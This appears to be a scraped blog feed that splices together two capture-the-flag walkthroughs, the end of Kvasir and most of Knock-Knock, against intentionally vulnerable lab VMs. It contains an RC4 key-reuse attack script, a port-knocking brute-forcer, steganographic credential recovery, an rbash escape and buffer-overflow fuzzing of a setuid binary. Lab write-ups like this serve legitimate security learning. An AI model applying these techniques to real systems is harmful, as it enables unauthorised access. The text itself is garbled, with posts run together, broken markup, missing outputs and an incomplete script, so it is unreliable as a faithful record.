<p>Ok, so this really looks like a disk image. I decided to mount it and have a look inside:</p>

<p>```bash
root@kali:~# mount diskimage /mnt/</p>

<p>root@kali:~# ls -lah /mnt/
total 21K
drwxr-xr-x  2 root root  16K Jan  1  1970 .

<p>A <code>.rar</code> archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image&hellip;</p>

<p>Some googling around got me a hit on a tool called <code>autopsy</code>, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:</p>

<p><img class="<a" src="href="https://i.imgur.com/SBIbnMU.png">https://i.imgur.com/SBIbnMU.png</a>"></p>

<p><code>C:/Funky.wav</code>. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the <em>Export</em> link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.</p>

<p>It sounded like this:</p>

<p><img class="<a" src="href="https://i.imgur.com/IbdKBKR.gif">https://i.imgur.com/IbdKBKR.gif</a>"></p>

<p>Yeah, I don&rsquo;t get it either. I was stumped for a few minutes again, until I remembered <a href="http://vulnhub.com/entry/xerxes-201,97/">Xerxes2</a>, which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by <a href="http://www.sonicvisualiser.org/index.html">Sonic Visualizer</a>. I downloaded the app, loaded the wav file and got the spectrogram to do its thing:</p>

<p>A final <code>tcp/8002</code> proxy was opened on my attacking machine.</p>

<h2>taking the last ride to the flag</h2>

<p>Enumeration as kefka revealed that this user is allowed to run <code>/opt/wep2.py</code> as root. This is almost screaming at me as the privilege escalation path!</p>

<p>I ran the script with sudo, just to be presented with&hellip; nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:</p>

<p>```bash
kefka@adm:~$ sudo /opt/wep2.py
^CTraceback (most recent call last):
  File &ldquo;/opt/wep2.py&rdquo;, line 93, in <module></p>

<pre><code>sock, addr = s.accept()

<p>  File &ldquo;/usr/lib/python2.7/socket.py&rdquo;, line 202, in accept</p>

<pre><code>sock, addr = self._sock.accept()
</code></pre>

<p>KeyboardInterrupt
kefka@adm:~$
```</p>

<p>I re-run the script backgrounding it with <code>&amp;</code>, and inspect the output of <code>netstat -pant</code> to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new <code>tcp/8002</code> proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:</p>

<p>```bash</p>

<h1>/etc/proxychains.conf has line</h1>

<h1>socks5    127.0.0.1 8002</h1>

<h1>connections will appear to be coming from localhost</h1>

<p>root@kali:~# proxychains nc -v 127.0.0.1 1234

```</p>

<p>We are presented with yet another <em>game</em>, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the <code>netcat</code> connection killed, causing me to have to re-run <code>sudo /opt/wep2.py</code> on the kefka session.</p>

<p>By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were <code>salt:cyphertext</code>, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with <em>A</em>, and studied the output:</p>

<p><code>bash
E A
348bbc:8d
E A
f2fb0c:6e
E A
64d7fb:2d
</code></p>

<p>Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.</p>

<p>Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename <code>wep2.py</code> should be taken as a hint!</p>

<p><em>This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)</em></p>

<h3>understanding what WEP actually is</h3>

<p>With the limited interaction I have had with the last game, and the hint <code>wep2</code>, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.</p>

<p>Some resources that really helped me get to grips with what we are facing here was:
 <a href="http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf">http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf</a>
 <a href="http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt">http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt</a>
 <a href="http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt">http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt</a>
 <a href="http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf">http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf</a></p>

<p>Of the above list, I highly recommend you check out the <code>.ppt</code>&rsquo;s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.</p>

<p>The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let <em>C</em> be the cipher text and <em>P</em> be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR&rsquo;d) with the plaintext to produce the cipher text. Typically, this is represented as:</p>

<p><strong>C = P ^ RC4(iv, k)</strong></p>

<p>With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about <a href="http://en.wikipedia.org/wiki/Stream_cipher_attack">Stream Cipher Attacks</a> and <a href="http://en.wikipedia.org/wiki/Related-key_attack">Related Key Attacks</a>. With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.</p>

<p>My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&rsquo;s, I can XOR the cipher text of the known clear text with the actual clear text to determine the key stream for that IV. Then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the <code>2</code> in <code>wep2</code> was another troll :)</p>

<h3>attacking the encryption game</h3>

<p>Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.</p>

<p>I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).</p>

<p>Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.</p>

<p>I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext&rsquo;s cipher text:</p>

<p>```bash
root@kali:~# proxychains ./un_wep-testing.py
ProxyChains-3.1 (<a href="http://proxychains.sf.net">http://proxychains.sf.net</a>)
[+] Generating base iv:cy dictionary with &lsquo;A&rsquo; <em>24
[+] iv_dict knows about 5000 combinations
[+] Starting Bruteforce with &lsquo;B&rsquo; </em>24
[+] Frame matched IV of 929d87 in 4559 tries!

<p>[+] A ^ B
BBBBBBBBBBBBBBBBBBBBBBBB
[+] Done
```</p>

<p>This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.</p>

<p>With the changes in, I ended up with the following script:</p>

<p>```bash</p>

<h1>!/usr/bin/python</h1>

<h1>Kvasir RC4 Key Re-use Attack</h1>

<p>import socket</p>

<h1>start a fresh iv_dict used for lookups</h1>

<p>iv_dict = {}</p>

sock.connect((&lsquo;127.0.0.1&rsquo;, 1234))</p>

<h1>create some iv:cyper combinations of the flag</h1>

<p>print &lsquo;[+] Generating base iv:cy dictionary&rsquo;
for i in range(0,5000):</p>

<pre><code>sock.send('V\n')
frame = sock.recv(150)
iv = frame.split(':')[0]
cy = frame.split(':')[1]

# add the values
iv_dict[iv] = cy.strip()
</code></pre>

<p>print &lsquo;[+] The iv_dict knows about %d combinations&rsquo; % len(iv_dict)</p>

<h1>start processing the second string, looking up the IV</h1>

<p>print &lsquo;[+] Starting Bruteforce with \'B\&rsquo; *24'
count = 0
while True:</p>

<pre><code>count += 1
sock.send('E ' + 'B' *24 + '\n')
frame = sock.recv(150)
iv = frame.split(':')[0]
cy = frame.split(':')[1].strip() # annoying \n

if iv in iv_dict:
    print '[+] Frame matched IV of %s in %d tries!' % (iv, count)
    print '[+] Base Cyper Text was: %s' % iv_dict[iv]
    print '[+] Matched Cypher Text: %s' % cy

    # first XOR to get the keystream for this IV
    keystream = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(cy.decode("hex"),'B'*24))
    print '[+] Keystream: %s' % keystream.encode("hex")

    # then decode second cypher text using the keystream for the cleartext
    decrypted = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip((iv_dict[iv]).decode("hex"),keystream))
    print '[+] Decrytped flag is: %s' % decrypted
    break

# progress incase things take longer than expected
if count % 100000 == 0:
    print '[+] Tries: %d' % count
</code></pre>

<p>print &lsquo;[+] Done&rsquo;
sock.close()
```</p>

<p>In no time at all, the above code outputs the decrypted flag:</p>

<p><code>bash

</code></p>

<p><code>0W6U6vwG4W1V</code>. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&hellip; bed time for me!!</p>

<h2>finally getting the flag, sort of&hellip;</h2>

<p>I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.</p>

<p>After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:</p>

<p>```bash
root@kali:~# proxychains nc -v 127.0.0.1 1234

<p>Wut. Ok, so I have a <em>thing</em> now. It didn’t accept anything I was typing into it. Everything just came back with another <code>&gt;</code>.</p>

<p>```bash</p>

<blockquote><p>ls

<p>```</p></blockquote>

<p>I disconnected from the netcat session and tabbed back to the session where the <code>/opt/wep2.py</code> script is started. Immediately it became clear what was going on:</p>

<p>```bash

<p>It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:</p>

<p>Err, oh <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself.

<h2>conclusion</h2>

<p>Wow. I actually can&rsquo;t describe how tired I am now haha. From both doing Kvasir and taking almost a full day for this writeup :D However, this is most definitely one of my most favorite boot2roots out there thus far!</p>

<p>Many many thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for putting together this polished piece of work and <a href="https://twitter.com/VulHub">@VulnHub</a> for the hosting!</p>

    <content type="html"><![CDATA[<h2>introduction</h2>

<p><a href="http://vulnhub.com/series/knock-knock,53/">Knock-Knock</a> is a vulnerable boot2root VM by <a href="https://twitter.com/zer0w1re">@zer0w1re</a> and sure as heck was packed with interesting twists and things to learn!</p>

<p>I figured I&rsquo;d just <em>have a quick look™</em>, and midnight that evening ended up with <em>root</em> privileges :D</p>

<p>As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
This is my experience &lsquo;knocking&rsquo; on the door.</p>

<h2>getting started</h2>

<p>As always, the vm&rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched <code>arp</code> for any new entries. This presented the first hurdle. A ping scan showed no new IP&rsquo;s in the network range my VM&rsquo;s were in (192.168.56.0/24):</p>

<p>```bash
$ sudo nmap -sN 192.168.56.0/24</p>

<p>Starting Nmap 6.47 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 09:51 SAST

```</p>

<p>Only the gateway was alive. A <code>arp -a</code> however spilled some of the beans:</p>

<p>```bash
$ arp -i vboxnet0 -a

<p>Hello <code>.203</code>! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:</p>

<p>While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal <code>nmap</code> scan:</p>

<h2>knock knock&hellip;</h2>

<p><code>tcp/1337</code> was the only open port on the machine. I promptly connected to it to see what we have:</p>

<p>```bash
root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[6605, 29872, 38566]</p>

<p>root@kali:~# nc -vn 192.168.56.203 1337
(UNKNOWN) [192.168.56.203] 1337 (?) open
[43059, 22435, 17432]
```</p>

<p>Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.</p>

<p><a href="http://en.wikipedia.org/wiki/Port_knocking">Port knocking</a> generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &lsquo;knocked&rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.</p>

<p>There are plenty of implementations of port knocking out there. My personal favorite being <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> by <a href="https://twitter.com/moxie">@moxie</a>. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> tails the <code>kern.log</code> and reacts on the correct sequences.</p>

<p>This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.</p>

<h2>&hellip;whos there?</h2>

<p>So with the <code>tcp/1337</code> service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using <code>nmap</code> to scan them:</p>

<p>```bash
root@kali:~# for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:25 SAST

PORT      STATE    SERVICE

```</p>

<p>With that done, I rescanned the box for any new open ports but nothing was different. I retried the <code>nmap</code> loop just to make sure, but it did not appear to make a difference.</p>

<p>Remembering that the sequence changed every time you connected to the <code>tcp/1337</code> service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the <code>tcp/1337</code> service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across <a href="https://github.com/jvinet/knock">knockd</a>. I downloaded the <a href="https://github.com/jvinet/knock/blob/master/src/knock.c">client</a> and compiled locally with <code>gcc knock.c -o knock</code> and tested to see if this makes any difference.</p>

<p>Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.</p>

<h2>22 and 80 too</h2>

<p>The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the <code>tcp/1337</code> service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:</p>

<p>```bash</p>

<blockquote><blockquote><blockquote><p>ip=IP(dst=&ldquo;192.168.56.203&rdquo;)
SYN=TCP(dport=40508,flags=&ldquo;S&rdquo;)
send(ip/SYN)
.
Sent 1 packets.</p>

<p>```</p></blockquote></blockquote></blockquote>

<p>After quite some time, suddenly, nmap reports <code>tcp/22</code> and <code>tcp/80</code> as open&hellip;</p>

<p>```bash
root@kali:~# nmap 192.168.56.203</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-10-14 11:40 SAST

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds
```</p>

<p><strong>W.T.F.</strong> I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.</p>

<p>With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:</p>

<p>```python</p>

<h1>!/usr/bin/python</h1>

<p>import socket
import itertools
import sys</p>

<p>destination = &ldquo;192.168.56.203&rdquo;</p>

<p>def clean_up_ports(raw_string):</p>

<pre><code>""" Clean up the raw string received on the socket"""
if len(raw_string) &lt;= 0:
    return None

# Remove the first [
raw_string = raw_string.replace('[','')
# Remove the second ]
raw_string = raw_string.replace(']','')
# split by commas
first_list = raw_string.split(',')

# start e empty return list
ports = []
for port in first_list:
    # strip the whitespace around the string
    # and cast to a integer
    ports.append(int(port.strip()))

return  ports
</code></pre>

<p>def main():</p>

<pre><code>print "[+] Getting sequence"

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((destination, 1337))
except Exception as e:
    print "[+] Unable to connect to %s on port 1337. %s" % (destination, e)
    sys.exit(1)

# receive the list
raw_list = sock.recv(20)

# get the ports in a actual python list
ports = clean_up_ports(raw_list)

print "[+] Sequence is %s" % ports
print "[+] Knocking on the door using all the possible combinations...\n"

# Lets knock all of the possible combinations of the ports list
for port_list in itertools.permutations(ports):

    print "[+] Knocking with sequence: %s" % (port_list,) 
    for port in port_list:
        print "[+] Knocking on port %s:%s" % (destination,port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        sock.connect_ex((destination, port))
        sock.close()

    print "[+] Finished sequence knock\n"
</code></pre>

<p>if <strong>name</strong> == &lsquo;<strong>main</strong>&rsquo;:</p>

<pre><code>print "[+] Knock knock opener"
main()
print "[+] Done"
</code></pre>

<p>```</p>

<p>Running this opened the ports every go :)</p>

<p>I know that I could test to see if say <code>tcp/22</code> was open, but I went with the assumption that you don&rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.</p>

<h2>may I burn the door now?</h2>

<p>So, focus shifted to the web server at <code>tcp/80</code>. Browsing to the web server presented us with the following:</p>

<p><img class="<a" src="href="https://i.imgur.com/5NdJ65y.png">https://i.imgur.com/5NdJ65y.png</a>"></p>

<p>Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like <code>wfuzz</code> etc. With the hint <em>Gotta look harder</em>, I decided to move my attention to the door image itself.</p>

<p><code>``bash
root@kali:~# wget http://192.168.56.203/knockknock.jpg

```</p>

<p>I will admit that I was not very keen on the idea that something may be stego&rsquo;d in the image and I was really hoping the hint would be very obvious. I opened up the image in a image viewer and zoomed in a little on the artifact I noticed at the bottom of the image. Nothing I could make real use of there.</p>

<p>Next, I ran the image through exiftool:</p>

<p>Roy Lichtenstein. The artist of the knock knock image?
Anyways. As you can see, nothing else that is really useful here. So the next part was to have a look at the jpeg in a raw perspective. I am no forensics expert or anything so I am pretty limited in knowledge here.</p>

<p>My idea was to try and recover the jpeg data from <code>knockknock.jpg</code> using <code>recoverjpeg</code>, and then compare the resulting image with the original and check for any differences.</p>

<p>```bash</p>

<h1>extract the jpeg data</h1>

<p>root@kali:~# recoverjpeg knockknock.jpg
Restored 1 picture</p>

<h1>the output image from the extract</h1>

<p>root@kali:~# ls image00000.jpg
image00000.jpg</p>

<h1>the cmp</h1>

<p>root@kali:~# cmp image00000.jpg knockknock.jpg
cmp: EOF on image00000.jpg
```</p>

<p>So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:</p>

<p><code>``bash
root@kali:~# tail -n 1 image00000.jpg
9��&lt;V ��v�ܫQqRJ5U�&lt;��W�V9</code>��5BV(��&lt;�t�WS�����1h</p>

<p>```</p>

<p>As expected, junk :P Lets look at <code>knockknock.jpeg</code>:</p>

</code></p>

<p>Hah! Login Credentials sound very promising!! :)</p>

<h2>ceasar opens the door</h2>

<p>After finding the hidden strings in the jpeg, I came to a quick realization that <code>abfnW:sax2Cw9Ow</code> was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.</p>

<p>I tried to browse to the paths in the web server such as <code>abfnW/</code> and <code>sax2Cw9Ow/</code>, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.</p>

<p>Turns out, the strings were encoded using a Ceasar Cipher (<a href="http://en.wikipedia.org/wiki/Caesar_cipher">ROT13</a>). With that in mind, I took to a few python 1 liners to decode the strings. Lets start with <strong>abfnW</strong>:</p>

<p><code>bash
root@kali:~# python -c 'print "abfnW".decode("rot13")'
nosaJ
</code></p>

<p>abfnW decoded directly to <strong>nosaJ</strong>. That is <em>Jason</em> reversed. So is the username <code>Jason</code>? Next, I tackled <code>sax2Cw9Ow</code> in a similar fashion:</p>

<p><code>bash
root@kali:~# python -c 'print "sax2Cw9Ow".decode("rot13")'
fnk2Pj9Bj
</code></p>

<p>sax2Cw9Ow decodes to <strong>fnk2Pj9Bj</strong>. Is this one also reversed? After a number of attempts and variations, it turns out that the user name is <strong>jason</strong> (without the cap <em>J</em>) and the password is <strong>fnk2Pj9Bj</strong> (jB9jP2knf reversed.) To get the strings in their correct values, we can use the following 2 one liners to get them:</p>

<p>```bash</p>

<h1>username</h1>

<p>root@kali:~# python -c &lsquo;print &ldquo;abfnW&rdquo;.decode(&ldquo;rot13&rdquo;)[::-1].lower()&rsquo;
jason</p>

<h1>password</h1>

<p>root@kali:~# python -c &lsquo;print &ldquo;sax2Cw9Ow&rdquo;.decode(&ldquo;rot13&rdquo;)[::-1]&rsquo;
jB9jP2knf
```</p>

<p>So to get our first shell:</p>

<p>```bash
root@kali:~/Desktop/knock-knock# ssh <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x6a;&#x61;&#115;&#x6f;&#110;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#53;&#54;&#46;&#x32;&#48;&#x33;">&#106;&#x61;&#115;&#111;&#x6e;&#x40;&#x31;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x35;&#54;&#x2e;&#50;&#48;&#x33;</a>

<h2>no rbash, just no</h2>

<p>Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:</p>

<p><code>bash
jason@knockknock:~$ -rbash: /dev/null: restricted: cannot redirect output
-rbash: /dev/null: restricted: cannot redirect output
</code>
Rbash? Oh well thats ok. I checked by inspecting the env var for <code>SHELL</code> which was <code>/bin/rbash</code> just to confirm. Thanks to having recently met a similar situation during the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> boot2root and learning new ways of breaking out of <code>rbash</code>, I just typed <code>nice /bin/bash</code>, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full <code>bash</code> shell.</p>

<h2>tiny file crypter</h2>

<p>Some quick initial enumeration did not reveal anything particularly interesting. In <code>jason</code>&rsquo;s home folder though was a file called <code>tfc</code>:</p>

Tiny File Crypter - 1.0

<p>Usage: ./tfc &lt;filein.tfc> &lt;fileout.tfc>
jason@knockknock:~$
```</p>

<p><em>Tiny File Crypter</em> appeared to take a input file and encrypt it. Fair enough. The file is owned by root with the <code>setuid</code> bit set, strongly suggesting that if we are able to exploit this binary somehow, we may be able to get root.</p>

<p>Some important observations about <code>tfc</code> during the first bits of testing; Input and output files must have the <code>.tfc</code> extension. <code>tfc</code> does not allow for symlinks as input and or output files. Lastly, the input and output file has to be set and accessible by <code>tfc</code>. Considering its run as root, that probably wont be a problem.</p>

<p>A sample encryption run can be seen as:</p>

<p>```bash</p>

<h1>we have a source document</h1>

<p>jason@knockknock:~$ cat test.tfc
This is a test document.</p>

<h1>we run the encryption program over it</h1>

<p>jason@knockknock:~$ ./tfc test.tfc crypt.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<h1>dump the encrypted file as hex. from the ascii we</h1>

<h1>can see its no longer human readable</h1>

<p>jason@knockknock:~$ xxd crypt.tfc
0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.&lt;..&ldquo;&amp;..@^.jm
0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j</p>

<h1>the resulting file is owned by root</h1>

<p>jason@knockknock:~$ ls -l crypt.tfc
-rw-r&mdash;r&mdash; 1 root jason 25 Oct 14 08:12 crypt.tfc
```</p>

<p>Now, there is one very important finding. We can reverse the encrypted file by simply running it through <code>tfc</code> again:</p>

<p>```bash
jason@knockknock:~$ ./tfc crypt.tfc reversed.tfc</p>

<blockquote><blockquote><p>File crypted, goodbye!</p></blockquote></blockquote>

<p>jason@knockknock:~$ cat reversed.tfc
This is a test document.
```</p>

<p>After finding this, quite a few ideas pop into ones head. Most notably, the fact that the encryption is reversible by using the same tool, suggests it is <a href="http://en.wikipedia.org/wiki/Symmetric-key_algorithm">symmetric</a> using the same key for encryption and decryption.</p>

<p>But ok. That actually means nothing now. It also definitely does not tell us how to break <code>tfc</code> either!</p>

<h2>fuzzing &amp; disassembling tfc</h2>

<p>With all of the information gathered thus far about <code>tfc</code>, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override <code>/etc/shadow</code> to replace <code>root</code>s password, or replace <code>/root/.ssh/authorized_keys</code> with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the <code>.tfc</code> extension.</p>

<p>By now it became very apparent that we have to bring <code>tfc</code> under the microscope and have a closer look at what is happening inside. The first step was to run <code>tfc</code> through <code>strings</code> and check the output:</p>

<p>```bash
jason@knockknock:~$ strings tfc
/lib/ld-linux.so.2</p>

<p>[&hellip; snip &hellip;]</p>

<p>[^_]</p>

<pre><code>Tiny File Crypter - 1.0

<p>```</p></blockquote></blockquote>

<p>As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D</p>

<p>I figured I needed to get <code>tfc</code> into <code>gdb</code> and inspect it further there, however this VM did not have <code>gdb</code> installed. So, I copied it off the VM onto my Kali Linux install and plugged it into <code>gdb</code>. Then, to get an idea of what its doing, I started to disassemble it, starting with <code>main</code>:</p>

<p>```bash
root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048924 &lt;+0>: push   ebp
   0x08048925 &lt;+1>: mov    ebp,esp</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x0804894e &lt;+42>:    mov    DWORD PTR [esp],eax
   0x08048951 &lt;+45>:    call   0x80486e6 <cryptFile>    #&lt;&mdash;&ndash;
   0x08048956 &lt;+50>:    test   eax,eax</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x0804896c &lt;+72>:    ret  <br/>
End of assembler dump.
gdb-peda$
```</p>

<p>After some initial setup work and argument checks we notice a call to a function called <code>cryptFile</code>. So the next logical step was to check what happening in that function:</p>

<p>```bash
gdb-peda$ disass cryptFile
Dump of assembler code for function cryptFile:
   0x080486e6 &lt;+0>: push   ebp
   0x080486e7 &lt;+1>: mov    ebp,esp
   0x080486e9 &lt;+3>: sub    esp,0x1088</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x080488a8 &lt;+450>:   mov    DWORD PTR [esp],eax
   0x080488ab &lt;+453>:   call   0x8048618 <xcrypt>       #&lt;&mdash;&ndash;
   0x080488b0 &lt;+458>:   mov    eax,DWORD PTR [ebp-0x14]</p>

<p>   [&hellip; snip &hellip;]</p>

<p>   0x08048922 &lt;+572>:   leave<br/>
   0x08048923 &lt;+573>:   ret  <br/>
End of assembler dump.
gdb-peda$
```</p>

<p><code>crytFile</code> does some internal <em>things</em> (like <code>call   0x80484a0 &lt;open@plt&gt;</code> opening the file?) and eventually calls a function <code>xcrypt</code>. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of <code>xor</code> calls it had. Of course, this is only a guess and I may have missed something else completely.</p>

<p>I also checked out the security features this binary was compiled with:</p>

<p><code>bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
</code></p>

<p>Woa. <strong>No</strong> security? Ok&hellip;</p>

<h2>we knocked and tfc opened the door to bof</h2>

<p>The disassembly of <code>tfc</code> did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)</p>

<p>So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:</p>

<p>```bash</p>

<h1>create a file of roughly 2MB</h1>

<p>root@kali:~# dd if=/dev/urandom of=large.tfc bs=1M count=2
2+0 records in
2+0 records out
2097152 bytes (2.1 MB) copied, 0.132812 s, 15.8 MB/s</p>

<h1>confirm the size of the file</h1>

<p>root@kali:~# ls -lh large.tfc
-rw-r&mdash;r&mdash; 1 root root 2.0M Oct 14 15:01 large.tfc</p>

<h1>check how many characters we have in the file</h1>

<p>root@kali:~# wc -c large.tfc
2097152 large.tfc</p>

<h1>attempt encryption</h1>

<p>root@kali:~# ./tfc large.tfc out.tfc
Segmentation fault
```</p>

<p><em>Segmentation fault</em>! Being able to crash <code>tfc</code> is really good news. I went on to test just how many characters were needed to crash <code>tfc</code> in a easily reproducible way, and it came down to something like 6000 characters were doing the job just fine. So, it was time to inspect this crash in <code>gdb</code>. I first prepared a new file with just &ldquo;A&rdquo; in it:</p>

<p><code>bash
root@kali:~# echo -n $(python -c 'print "A"*6000') &gt; gdb-test.tfc
</code></p>

<p>And continued to run it in <code>gdb</code>:</p>

<p>```bash
root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc&hellip;(no debugging symbols found)&hellip;done.
gdb-peda$ r gdb-test.tfc gdb-test-out.tfc</p>

<p>Ow. Ok, so we don&rsquo;t crash with a clean <em>0x41414141</em> as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.</p>

<h2>planning a exploit</h2>

